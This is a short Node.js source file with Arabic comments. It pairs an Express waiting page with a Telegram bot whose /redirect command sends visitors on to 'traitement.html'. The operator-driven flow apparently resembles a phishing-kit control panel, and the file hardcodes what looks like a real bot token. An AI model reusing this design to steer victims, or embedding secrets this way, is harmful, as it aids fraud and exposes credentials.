const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const path = require('path');

// إعداد Express
const app = express();
const port = 3000;

// إعداد Telegram Bot
const token = '7902984772:AAE9oYZ58ri5xBGrna2MIOX-pKBtjzmjeX4'; // ⚠️ استبدل هذا بـ Token الخاص بك
const bot = new TelegramBot(token, { polling: true });

// متغير لتخزين حالة التوجيه
let shouldRedirect = false;

// صفحة الانتظار (Frontend)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API للتحقق من التوجيه
app.get('/api/check-redirect', (req, res) => {
    res.json({
        redirect: shouldRedirect,
        redirectUrl: 'traitement.html' // الصفحة الهدف
    });
});

// API لتشغيل التوجيه (يمكن استدعاؤها من بوت Telegram)
app.get('/api/trigger-redirect', (req, res) => {
    shouldRedirect = true;
    res.send('✅ تم تفعيل التوجيه!');
});

// Telegram Bot Command
bot.onText(/\/redirect/, (msg) => {
    const chatId = msg.chat.id;
    axios.get('http://localhost:3000/api/trigger-redirect') // استدعاء API المحلي
        .then(() => bot.sendMessage(chatId, '🚀 تم توجيه المستخدم!'))
        .catch(() => bot.sendMessage(chatId, '❌ فشل في التوجيه!'));
});

// تشغيل الخادم
app.listen(port, () => {
    console.log(`✅ الخادم يعمل على http://localhost:${port}`);
});
